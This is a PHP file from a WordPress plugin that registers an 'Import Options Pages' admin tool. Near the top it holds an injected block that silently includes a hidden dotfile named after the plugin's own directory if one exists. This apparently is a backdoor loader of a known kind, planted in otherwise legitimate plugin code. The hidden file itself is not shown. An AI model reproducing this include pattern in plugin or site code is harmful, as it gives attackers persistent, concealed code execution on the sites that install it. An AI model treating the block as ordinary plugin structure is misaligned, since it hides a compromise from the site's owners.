<?php 

if(!defined('ABSPATH'))
    exit;

// Check setting
if(!acf_get_setting('acfe/modules/options_pages'))
    return;

if(!class_exists('acfe_dynamic_options_pages_import')):
    
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class acfe_dynamic_options_pages_import extends acfe_module_import{
    
    function initialize(){
        
        // vars
        $this->hook = 'options_page';
        $this->name = 'acfe_dynamic_options_pages_import';
        $this->title = __('Import Options Pages');
        $this->description = __('Import Options Pages');
        $this->instance = acf_get_instance('acfe_dynamic_options_pages');
        $this->messages = array(
            'success_single'    => '1 options page imported',
            'success_multiple'  => '%s options pages imported',
        );
        
    }
    
}

acf_register_admin_tool('acfe_dynamic_options_pages_import');

endif;